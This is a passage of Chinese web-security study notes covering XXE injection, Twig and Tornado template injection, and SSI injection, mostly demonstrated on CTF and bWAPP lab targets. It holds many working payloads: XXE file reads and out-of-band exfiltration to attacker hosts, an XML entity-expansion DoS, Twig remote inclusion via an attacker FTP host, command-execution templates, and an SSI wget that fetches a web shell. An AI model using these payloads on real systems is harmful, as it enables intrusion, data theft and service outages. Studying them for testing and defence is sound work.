如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件（引入系统自带的DTD文件），并在其中定义一些实体内容就行。

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
	<!ENTITY % ISOamso '
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">
		&#x25;eval;
		&#x25;send;
	'> 
	%remote;
]>
<message>1234</message>

```

我们仔细看一下很好理解，第一个调用的参数实体是%remote，在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send

##### 嵌套参数实体

> 我发现，虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">  
	<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
	%start;
	%send;
]>
<message>10</message>
```

基于报错的三层嵌套参数实体XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ELEMENT message ANY>
	<!ENTITY % para1 SYSTEM "file:///flag">
	<!ENTITY % para '
		<!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
		&#x25;para2;
	'>
	%para;
]>
<message>10</message>
```

#### 3.2 内网探测

和读文件差不多，只不过把URI改成内网机器地址；只能探测内网web服务器

```xml
<?xml version="1.0" encoding="UTF-8"?>        
<!DOCTYPE foo [ 
<!ELEMENT foo ANY >
<!ENTITY rabbit SYSTEM "http://127.0.0.1/1.txt" >
]>
<user><firstname>&rabbit;</firstname><lastname>666</lastname></user>
```

#### 3.3 RCE

这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2018-10-01</date>
      <description>&xxe;</description>
   </core>
</catalog>
```

响应：

```
{"error": "no results for description uid=0(root) gid=0(root) groups=0(root)...
```

#### 3.4 DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。亦或者，如果目标是UNIX系统，XML 解析器尝试使用`/dev/random`文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>
```

## 4. XXE黑盒注入

### 4.1 XML数据传输特征

![屏幕截图 2023-11-23 085738](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-23%20085738.jpg)

### 4.2 XXE注入读取文件

```xml-dtd
payload：
<!DOCTYPE ANY [<!ENTITY test SYSTEM "file:///flag">]>
<user><username>&test;</username><password>note</password></user>
```

![image-20231123092247282](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092247282.png)

### 4.3 无回显带外测试

#### 4.3.1 申请域名

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092647688.png" alt="image-20231123092647688" style="zoom:50%;" />

#### 4.3.2 带外注入尝试

```xml-dtd
payload：
<?xml version="1.0" ?>
<!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://afqxpc.dnslog.cn">
        %file;
        ]>
<user><username>&file;</username><password>note</password></user>
```

#### 3.3.3 刷新查看结果

由此可看出靶机确实访问了该站点。证明了的确存在XXE注入lou'd

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092759541.png" alt="image-20231123092759541" style="zoom:67%;" />

# XXE 注入-新

### 1. DTD教程

#### 1.1 DTD 简介

**文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。**

**DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。**

##### 内部的 DOCTYPE 声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：

```
<!DOCTYPE 根元素 [元素声明]>
```

带有 DTD 的 XML 文档实例（请在 IE5 以及更高的版本打开，并选择查看源代码）：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>
```

**以上 DTD 解释如下：**

*!DOCTYPE note* (第二行)定义此文档是 *note* 类型的文档。

*!ELEMENT note* (第三行)定义 *note* 元素有四个元素："to、from、heading,、body"

*!ELEMENT to* (第四行)定义 *to* 元素为 "#PCDATA" 类型

*!ELEMENT from* (第五行)定义 *from* 元素为 "#PCDATA" 类型

*!ELEMENT heading* (第六行)定义 *heading* 元素为 "#PCDATA" 类型

*!ELEMENT body* (第七行)定义 *body* 元素为 "#PCDATA" 类型

##### 外部文档声明

假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：

```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: （[在 IE5 中打开](https://www.w3school.com.cn/dtd/note_ex_dtd.xml)，并选择“查看源代码”命令。）

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

这是包含 DTD 的 "note.dtd" 文件：

```xml
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

##### 为什么使用 DTD？

通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。

通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。

而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。

您还可以使用 DTD 来验证您自身的数据。

#### 1.2 XML 构建模块

##### 实体

实体是用来定义普通文本的变量。实体引用是对实体的引用。

大多数同学都了解这个 HTML 实体引用："&nbsp;"。这个“无折行空格”实体在 HTML 中被用于在某个文档中插入一个额外的空格。

当文档被 XML 解析器解析时，实体就会被展开。

##### 下面的实体在 XML 中被预定义：

| 实体引用 | 字符 |
| :------- | :--- |
| &lt;     | <    |
| &gt;     | >    |
| &amp;    | &    |
| &quot;   | "    |
| &apos;   | '    |

##### PCDATA

PCDATA 的意思是被解析的字符数据（parsed character data）。

可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。

**PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。**

文本中的标签会被当作标记来处理，而实体会被展开。

不过，被解析的字符数据不应当包含任何 &、< 或者 > 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。

##### CDATA

CDATA 的意思是字符数据（character data）。

*CDATA 是不会被解析器解析的文本。*在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。

# Twig 模板注入

## 1. Twig 安装

建议通过 Composer 安装 Twig：我的Windows在直接在项目文件夹下执行这条命令即可

```
composer require "twig/twig:^3.0"
```

## 2. 注入原理

和其他的模板注入一样，Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：

这里的代码中，`createTemplate` 时注入了 `$_GET['name']`，此时就会引发模板注入。

```php
<?php
require_once __DIR__.'/vendor/autoload.php';
$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}");
echo $template->render();
```

![image-20231125121342568](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231125121342568.png)

而如下代码则不会，因为模板引擎解析的是字符串常量中的 `{{name}}`，而不是动态拼接的 `$_GET["name"]`：这里的`{{name}}`由开发者静态指定

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```

## 3. Twig 1.x 注入

测试代码如下：

- index.php

```
<?php

include __DIR__.'/vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
echo $twig->render($_GET['name']);
?>
```

在 Twig 1.x 中存在三个全局变量：

- `_self`：引用当前模板的实例。
- `_context`：引用当前上下文。
- `_charset`：引用当前字符集。

对应的代码是：

```
protected $specialVars = [
        '_self' => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    ];
```

这里主要就是利用 `_self` 变量，它会返回当前 `\Twig\Template` 实例，并提供了指向 `Twig_Environment` 的 `env` 属性，这样我们就可以继续调用 `Twig_Environment` 中的其他方法，从而进行 SSTI。

比如以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include` 开启的情况下我们可以通过改变路径实现远程文件包含：

```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

此外还有 `getFilter` 方法：

```
public function getFilter($name)
  {
    ...
    foreach ($this->filterCallbacks as $callback) {
    if (false !== $filter = call_user_func($callback, $name)) {
      return $filter;
    }
  }
  return false;
}

public function registerUndefinedFilterCallback($callable)
{
  $this->filterCallbacks[] = $callable;
}
```

我们在 `getFilter` 里发现了危险函数 `call_user_func`。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. Twig 2.注入

- index.php

```
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

到了 Twig 2.x / 3.x 版本中，`__self` 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。

### 4.1 使用 map 过滤器

在 Twig 3.x 中，`map` 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：

![image-20240223160233734](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160233734.png)

当我们如下使用 `map` 时：

![image-20240223160652895](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160652895.png)

Twig 3.x 会将其编译成：

![image-20240223160702357](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160702357.png)

这个 `twig_array_map` 函数的源码如下：

```
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    }

    return $r;
}
```

从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 value 和 key。`$array` 和 `$arrow` 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：

```
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

前三个都可以使用。相应的 Payload 如下：

![`](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160712261.png)

![image-20240223163551935](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223163551935.png)

![image-20240223160721623](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160721623.png)

如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码：

![image-20240223160733786](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160733786.png)

按照 `map` 的利用思路，我们去找带有 `$arrow` 参数的，可以发现下面几个过滤器也是可以利用的。

### 4.2 使用 sort滤器

这个 `sort` 筛选器可以用来对数组排序。

![image-20240223160741511](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160741511.png)

你可以传递一个箭头函数来对数组进行排序：

![image-20240223160749138](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160749138.png)

类似于 `map`，模板编译的过程中会进入 `twig_sort_filter` 函数，这个 `twig_sort_filter` 函数的源码如下：

```
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow);    // 直接被 uasort 调用 
    } else {
        asort($array);
    }

    return $array;
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `uasort` 函数调用。众所周知 `uasort` 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：

```
php > $arr = ["id",0];
php > usort($arr,"system");
uid=0(root) gid=0(root) groups=0(root)
php >
```

知道了做这些我们便可以构造 Payload 了：

![image-20240223160804445](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160804445.png)

### 4.3 使用 filter 过滤器

这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：

![image-20240223160812260](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160812260.png)

类似于 `map`，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下：

```
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_filter` 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：

```
php > $arr = ["id"];
php > array_filter($arr,"system");
uid=0(root) gid=0(root) groups=0(root)
php >
```

下面给出几个 Payload：

![image-20240223160824469](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160824469.png)

### 4.4 使用reduce过滤器

这个 `reduce` 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：

![image-20240223160832300](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160832300.png)

类似于 `map`，模板编译的过程中会进入 `twig_array_reduce` 函数，这个 `twig_array_reduce` 函数的源码如下：

```
function twig_array_reduce($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_reduce` 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。

直接给出 Payload：

![image-20240223160841143](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160841143.png)

# tornado 模板注入

> 参考：https://xz.aliyun.com/t/12260#toc-8

## 1. 常规手法:

Tornado中SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活：

![image-20240223160850366](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223160850366.png)

## 2. 利用 HTTPServerRequest：

为了方便下面把 `tornado.httputil.HTTPServerRequest` 的实例称为 `request`。

注意，由于属性非常多，属性自己也还有属性。所以这部分我只列了一些我感觉会用到的属性，肯定不全，有特殊需求的话需要自行进行挖掘。

**绕过字符限制**：

- `request.query`：包含 get 参数
- `request.query_arguments`：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）
- `request.arguments`：包含 get、post 参数
- `request.body`：包含 post 参数
- `request.body_arguments`：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）
- `request.cookies`：就是 cookie
- `request.files`：上传的文件
- `request.headers`：请求头
- `request.full_url`：完整的 url
- `request.uri`：包含 get 参数的 url。有趣的是，直接 `str(requests)` 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 `.` 或者 `getattr` 之类的函数了。
- `request.host`：Host 头
- `request.host_name`：Host 头

```
{{request.method}}  //返回请求方法名  GET|POST|PUT...
{{request.query}}  //传入?a=123 则返回a=123
{{request.arguments}}   //返回所有参数组成的字典
{{request.cookies}}   //同{{handler.cookies}}
```

**回显结果**

- `request.connection.write`
- `request.connection.stream.write`
- `request.server_connection.stream.write`

例如：

![image-20240223161017367](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223161017367.png)

### 2.1 利用 Application:

主要用于攻击的有这几个属性：

```
- Application.settings：web 服务的配置，可能会泄露一些敏感的配置
- Application.add_handlers：新增一个服务处理逻辑，可用于制作内存马，后面会一起说
- Application.wildcard_router.add_rules：新增一个 url 处理逻辑，可用于制作内存马
- Application.add_transform：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马
```

### 2.1 利用 RequestHandler:

为了方便下面把 `tornado.web.RequestHandler` 称为 `handler`。需要注意的是，handler 是有 `request` 属性的，所以理论上 handler 要比 request 实用。

```
{{handler.get_argument('yu')}}   //比如传入?yu=123则返回值为123
{{handler.cookies}}  //返回cookie值
{{handler.get_cookie("data")}}  //返回cookie中data的值
{{handler.decode_argument('\u0066')}}  //返回f，其中\u0066为f的unicode编码
{{handler.get_query_argument('yu')}}  //比如传入?yu=123则返回值为123
{{handler.settings}}  //比如传入application.settings中的值
```

**绕过字符限制**:

1. `RequestHandler.request.*`：参考利用 `HTTPServerRequest` 那节
2. 其他和 request 一样的方法：例如 `get_argument` 等等，就不一一列举了，可以参考官方文档

**回显结果**:

```
- RequestHandler.set_cookie：设置 cookie
- RequestHandler.set_header：设置一个新的响应头
- RequestHandler.redirect：重定向，可以通过 location 获取回显
- RequestHandler.send_error：发送错误码和错误信息
- RequestHandler.write_error：同上，被 `send_error` 调用
```

## 绕过：

### global()函数全局调用&绕过`_`:

我们可以发现在tornado中是可以直接使用global()函数的，更令我们兴奋的是竟然可以直接调用一些python的初始方法，比如**import**、eval、print、hex等，这下似乎我们的payload可以更加简洁了

```
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}
```

其中第二种方法更多的是为了我们刚才讲到的目的，绕过对`_`的过滤。

```
{{eval(handler.get_argument('yu'))}}
?yu=__import__("os").popen("ls").read()
```

### 绕过`.`：

因为tornado中没有过滤器，这样的话我们想要绕过对于.的过滤就有些困难了。而如果想要绕过对于引号的过滤，可以将上面的payload改成如下格式

```
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
```

### 无过滤payload ：

![image-20240223161029835](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223161029835.png)

过滤payload：

![image-20240223163359270](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240223163359270.png)

# SSI 注入

> 参考：https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/

## 0x01 基本概念

### 何为SSI

SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。

SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。

基本原理就是：**SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。**

### SHTML文件

SHTML即Server-Parsed HTML。

shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理。

### Web服务启动SSI

#### Nginx

在Nginx中，开启SSI只需在配置文件中添加如下几项：

```
ssi on;
ssi_silent_errors off;
ssi_types text/shtml;
```

如：

```
server{
	listen 80;
	server_name www.hello.com
	# 配置SSL
	ssi on; # 开启SSI支持
	ssi_silent_errors on; # 默认为off，设置为on则在处理SSI文件出错时不输出错误信息
	ssi_types text/html; # 需要支持的shtml 默认是 text/html
	
	location / {
		root html;
		index index.html index.htm;
	}
}
```

#### Apache

修改Apache配置文件httpd.conf：

1、确认加载include.so模块，将注释去掉：

```
LoadModule include_module libexec/apache2/mod_include.so
```

2、AddType部分去掉这两段注释：

```
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

3、Directory目录权限里面找到`Options Indexes FollowSymLinks`，并增加Includes修改为`Options Indexes FollowSymLinks Includes`；

4、重新启动Apache；

#### IIS

不同版本的Windows下配置有所区别，具体的参考下资料就好：

[win7下使用IIS服务器及自定义服务器端包含模块（SSI）步骤](https://www.cnblogs.com/liuzhibin/p/5386454.html)

[IIS SHTML支持设置方法（SSI）](https://www.jb51.net/article/20312.htm)

### SSI基本语法

在SHTML文件中SSI标签使用的几种基本语法如下，必须注意的是其语法格式必须是以html的注释符`<!--`开头、且后面紧接#符号和SSI命令，它们期间不能存在空格：

**1、显示服务器端环境变量`<#echo>`**

本文档名称：`<!--#echo var="DOCUMENT_NAME"-->`

现在时间：`<!--#echo var="DATE_LOCAL"-->`

显示IP地址：`<!--#echo var="REMOTE_ADDR"-->`

**2、将文本内容直接插入到文档中`<#include>`**

```
<!--#include file="文件名称"-->
<!--#include virtual="index.html" -->
<!--#include virtual="文件名称"–>
<!--#include virtual="/www/footer.html" -->
```

注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。

**3、显示WEB文档相关信息`<#flastmod><#fsize>`(如文件制作日期/大小等)**

文件最近更新日期：`<! #flastmod file="文件名称"–>`

文件的长度：`<!--#fsize file="文件名称"-->`

**4、直接执行服务器上的各种程序`<#exec>`(如CGI或其他可执行程序)**

```
<!–#exec cmd="文件名称"–>
<!--#exec cmd="cat /etc/passwd"--
<!–#exec cgi="文件名称"–>
<!--#exec cgi="/cgi-bin/access_log.cgi"–>
```

将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是CGI。

**5、设置SSI信息显示格式`<#config>`(如文件制作日期/大小显示方式)**

**6、高级SSI可设置变量使用if条件语句**

## 0x02 SSI注入漏洞

### 何为SSI注入

SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。

简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。

SSI注入允许远程在Web应用中注入脚本来执行代码。简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。

### 前提条件

攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：

1. Web服务器支持并开启了SSI；
2. Web应用程序在返回HTML页面时，嵌入了用户输入的内容；
3. 外部输入的参数值未进行有效的过滤；

### 漏洞场景

一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。也就是说，用户输入的内容会显示在页面中的场景。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。

从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：

- 文件相关的属性字段
- 当前时间
- 访客IP
- 调用CGI程序

### SSI注入常用命令

这里可以参考OWASP的说明：https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection

#### 命令执行

**Linux**

列出目录文件：

```
<!--#exec cmd="ls" -->
```

访问目录：

```
<!--#exec cmd="cd /root/dir/">
```

执行脚本：

```
<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
```

**Windows**

列出目录文件：

```
<!--#exec cmd="dir" -->
```

访问目录：

```
<!--#exec cmd="cd C:\admin\dir">
```

#### 访问与设置服务器信息

更改错误消息输出：

```
<!--#config errmsg="File not found, informs users and password"-->
```

显示当前文档的文件名：

```
<!--#echo var="DOCUMENT_NAME" -->
```

显示虚拟路径和文件名：

```
<!--#echo var="DOCUMENT_URI" -->
```

使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：

```
<!--#config timefmt="A %B %d %Y %r"-->
```

使用“ fsize”命令，可以打印所选文件的大小：

```
<!--#fsize file="ssi.shtml" -->
```

#### ssinc.dll缓冲区溢出漏洞

在IIS的4.0和5.0版本中，攻击者可以通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统特权。ssinc.dll是用于解释服务器端包含文件的程序。

通过创建包含以下SSI代码的恶意页面并强制Web应用加载该页面（ 路径遍历攻击），可以执行以下攻击：

ssi_over.shtml：

```
<!--#include file="UUUUUUUU...UU"-->
```

注意，字符U的数量必须大于2049。

强制Web应用加载ssi_over.shtml页面：

正常网站：`www.vulnerablesite.org/index.asp?page=news.asp`

恶意网站：`www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml`

如果IIS返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵过程流并执行任意代码。

### Demo

下面直接看BWAPP的SSI注入漏洞环境。

#### Low级

页面是个表单，可以输入First name和Last name，然后提交来查询你的IP地址：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1.png)

随便输入些内容点击Lookup，跳转至新的页面：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2.png)

可看到该页面是shtml页面，并且用户输入的表单信息直接输出在该页面上。

当然，我们输入XSS payload，就会弹框了，后台没有进行任何过滤：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/3.png)

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4.png)

这就满足前面所说的场景了，该页面是SHTML文件，且存在反射型XSS，同时我们可以推测服务端是开启SSI的（因为对IP地址进行了查询操作并输出在页面上），那么该页面时大概率存在SSI注入漏洞的。

下面来验证一下，直接输入执行系统命令的SSI标签：

```
<!--#exec cmd="whoami"-->
```

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5.png)

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/6.png)

据此，我们就可以知道，下面显示lookup结果的IP地址的SSI标签为`<!--#echo var="REMOTE_ADDR"-->`。

#### Medium级

该级别下XSS不能通过引号来将字符串括起来再弹框输出，因为后台程序在引号前添加了反斜杠进行了转义：

